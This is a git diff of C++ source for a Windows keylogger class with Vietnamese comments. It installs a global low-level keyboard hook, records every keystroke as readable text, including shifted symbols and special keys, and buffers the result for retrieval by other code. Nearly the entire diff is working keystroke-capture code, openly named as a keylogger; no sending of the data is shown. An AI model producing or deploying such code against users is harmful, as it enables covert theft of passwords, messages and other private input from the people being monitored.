@@ -9,33 +9,37 @@ std::mutex Keylogger::_mtx;
 Keylogger::Keylogger() : _isRunning(false) {}
 
 Keylogger::~Keylogger() {
-    Stop();
+    Stop(); // Đảm bảo dừng thread khi hủy class
 }
 
+// --- PHẦN 1: Logic xử lý chuỗi ---
 void Keylogger::append(const std::string& str) {
+    // Thread-safe buffer access
     std::lock_guard<std::mutex> lock(_mtx);
-    if (_buffer.capacity() < _buffer.size() + 10) {
-        _buffer.reserve(_buffer.size() * 2 + 256);
-    }
     _buffer.push_back(str);
 }
 
+// --- PHẦN 2: Hàm xử lý phím (Hook Procedure) ---
 LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    // Process valid keydown events only
     if (nCode >= 0 && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
-        int key = kbdStruct->vkCode;
+        int key = kbdStruct->vkCode; // Lấy mã phím ảo
 
+        // Xử lý các phím đặc biệt để dễ đọc
         if (key == VK_RETURN) append("[RETURN]");
-        else if (key == VK_TAB) append("[TAB]");
-        else if (key == VK_SPACE) append(" ");
         else if (key == VK_BACK) append("[DELETE]");
+        else if (key == VK_SPACE) append(" ");
+        else if (key == VK_TAB) append("[TAB]");
         else if (key == VK_DELETE) append("[DEL]");
         else if (key == VK_ESCAPE) append("[ESC]");
-        else if (key == VK_LWIN || key == VK_RWIN) append("[CMD]");
-        else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) append("[SHIFT]");
-        else if (key == VK_CAPITAL) append("[CAPS]");
-        else if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU) append("[OPT]");
+        else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) {}
         else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) append("[CTRL]");
+        else if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU) append("[ALT]");
+        else if (key == VK_LWIN || key == VK_RWIN) append("[WIN]");
+        else if (key == VK_CAPITAL) append("[CAPS]");
+        else if (key == VK_NUMLOCK) append("[NUMLOCK]");
+        else if (key == VK_SCROLL) append("[SCROLL]");
         else if (key == VK_LEFT) append("[LEFT]");
         else if (key == VK_RIGHT) append("[RIGHT]");
         else if (key == VK_UP) append("[UP]");
@@ -60,7 +64,95 @@ LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
         else if (key == VK_F13) append("[F13]");
         else if (key == VK_F14) append("[F14]");
         else if (key == VK_F15) append("[F15]");
-        else if (key == VK_NUMLOCK) append("[NUMLOCK]");
+        else if (key == VK_OEM_1) {
+            BYTE keyState[256];
+            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
+                append(":");
+            } else {
+                append(";");
+            }
+        }
+        else if (key == VK_OEM_PLUS) {
+            BYTE keyState[256];
+            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
+                append("+");
+            } else {
+                append("=");
+            }
+        }
+        else if (key == VK_OEM_COMMA) {
+            BYTE keyState[256];
+            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
+                append("<");
+            } else {
+                append(",");
+            }
+        }
+        else if (key == VK_OEM_MINUS) {
+            BYTE keyState[256];
+            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
+                append("_");
+            } else {
+                append("-");
+            }
+        }
+        else if (key == VK_OEM_PERIOD) {
+            BYTE keyState[256];
+            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
+                append(">");
+            } else {
+                append(".");
+            }
+        }
+        else if (key == VK_OEM_2) {
+            BYTE keyState[256];
+            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
+                append("?");
+            } else {
+                append("/");
+            }
+        }
+        else if (key == VK_OEM_3) {
+            BYTE keyState[256];
+            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
+                append("~");
+            } else {
+                append("`");
+            }
+        }
+        else if (key == VK_OEM_4) {
+            BYTE keyState[256];
+            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
+                append("{");
+            } else {
+                append("[");
+            }
+        }
+        else if (key == VK_OEM_5) {
+            BYTE keyState[256];
+            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
+                append("|");
+            } else {
+                append("\\");
+            }
+        }
+        else if (key == VK_OEM_6) {
+            BYTE keyState[256];
+            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
+                append("}");
+            } else {
+                append("]");
+            }
+        }
+        else if (key == VK_OEM_7) {
+            BYTE keyState[256];
+            if (GetKeyboardState(keyState) && (keyState[VK_SHIFT] & 0x80)) {
+                append("\"");
+            } else {
+                append("'");
+            }
+        }
+        // Xử lý số và chữ cái với Shift
         else if ((key >= '0' && key <= '9') || (key >= 'A' && key <= 'Z')) {
              BYTE keyState[256];
              if (GetKeyboardState(keyState)) {
@@ -85,96 +177,38 @@ LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
                      }
                  }
              } else {
-                 WCHAR unicodeChars[4] = {0};
-                 BYTE fallbackKeyState[256] = {0};
-                 if (GetKeyboardState(fallbackKeyState)) {
-                     int result = ToUnicode(key, 0, fallbackKeyState, unicodeChars, 4, 0);
-                     if (result > 0) {
-                         std::wstring wstr(unicodeChars, result);
-                         int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), NULL, 0, NULL, NULL);
-                         if (size_needed > 0) {
-                             std::string utf8Str(size_needed, 0);
-                             WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), &utf8Str[0], size_needed, NULL, NULL);
-                             append(utf8Str);
-                         } else {
-                             append("[" + std::to_string(key) + "]");
-                         }
-                     } else {
-                         append("[" + std::to_string(key) + "]");
-                     }
-                 } else {
-                     append("[" + std::to_string(key) + "]");
-                 }
+                 append(std::string(1, (char)key));
              }
         }
         else {
-             BYTE keyState[256];
-             WCHAR unicodeChars[4] = {0};
-             
-             if (GetKeyboardState(keyState)) {
-                 int result = ToUnicode(key, 0, keyState, unicodeChars, 4, 0);
-                 
-                 if (result > 0) {
-                     std::wstring wstr(unicodeChars, result);
-                     int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), NULL, 0, NULL, NULL);
-                     if (size_needed > 0) {
-                         std::string utf8Str(size_needed, 0);
-                         WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), &utf8Str[0], size_needed, NULL, NULL);
-                         append(utf8Str);
-                     } else {
-                         WORD translated[2] = {0};
-                         int asciiResult = ToAscii(key, 0, keyState, translated, 0);
-                         if (asciiResult == 1 && translated[0] >= 32 && translated[0] <= 126) {
-                             append(std::string(1, (char)translated[0]));
-                         } else {
-                             append("[" + std::to_string(key) + "]");
-                         }
-                     }
-                 } else if (result == -1) {
-                 } else {
-                     WORD translated[2] = {0};
-                     int asciiResult = ToAscii(key, 0, keyState, translated, 0);
-                     if (asciiResult == 1 && translated[0] >= 32 && translated[0] <= 126) {
-                         append(std::string(1, (char)translated[0]));
-                     } else {
-                         if (key == VK_OEM_1) append(";");
-                         else if (key == VK_OEM_PLUS) append("=");
-                         else if (key == VK_OEM_COMMA) append(",");
-                         else if (key == VK_OEM_MINUS) append("-");
-                         else if (key == VK_OEM_PERIOD) append(".");
-                         else if (key == VK_OEM_2) append("/");
-                         else if (key == VK_OEM_3) append("`");
-                         else if (key == VK_OEM_4) append("[");
-                         else if (key == VK_OEM_5) append("\\");
-                         else if (key == VK_OEM_6) append("]");
-                         else if (key == VK_OEM_7) append("'");
-                         else {
-                             append("[" + std::to_string(key) + "]");
-                         }
-                     }
-                 }
-             } else {
-                 append("[" + std::to_string(key) + "]");
-             }
+             // Các phím lạ thì ghi mã số
+             append("[" + std::to_string(key) + "]");
         }
     }
+    // Forward event to next hook (required for keyboard to work)
     return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
+// --- PHẦN 3: Quản lý luồng (Threading) ---
 void Keylogger::Start() {
     if (_isRunning) return;
     _isRunning = true;
 
+    // Tạo luồng riêng để lắng nghe
     _workerThread = std::thread([this]() {
+        // Cài đặt Hook
         _hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
 
+        // Vòng lặp tin nhắn (Message Loop)
+        // Bắt buộc phải có để Hook hoạt động trên Windows
         MSG msg;
         while (_isRunning && GetMessage(&msg, NULL, 0, 0)) {
-            if (msg.message == WM_QUIT) break;
+            if (msg.message == WM_QUIT) break; // Nhận lệnh thoát thì dừng
             TranslateMessage(&msg);
             DispatchMessage(&msg);
         }
 
+        // Dọn dẹp hook khi vòng lặp kết thúc
         if (_hook) {
             UnhookWindowsHookEx(_hook);
             _hook = NULL;
@@ -186,23 +220,22 @@ void Keylogger::Stop() {
     if (!_isRunning) return;
     _isRunning = false;
 
+    // Gửi tin nhắn WM_QUIT vào luồng worker để đánh thức GetMessage và thoát vòng lặp
     if (_workerThread.joinable()) {
         PostThreadMessage(GetThreadId(_workerThread.native_handle()), WM_QUIT, 0, 0);
         _workerThread.join();
     }
 }
 
+// --- PHẦN 4: Lấy dữ liệu an toàn ---
 vector<std::string> Keylogger::getDataAndClear() {
-    std::lock_guard<std::mutex> lock(_mtx);
+    std::lock_guard<std::mutex> lock(_mtx); // Khóa lại!
     
-    if (_buffer.empty()) {
-        return {};
-    }
+    if (_buffer.empty()) return {};
     
-    vector<std::string> result = std::move(_buffer);
-    _buffer.clear();
-    _buffer.reserve(256);
+    vector<std::string> dataCopy = _buffer; // Copy dữ liệu ra
+    _buffer.clear();                // Xóa dữ liệu gốc đi
     
-    return result;
-}
+    return dataCopy; // Trả về bản copy
+} // Tự động mở khóa
 #endif
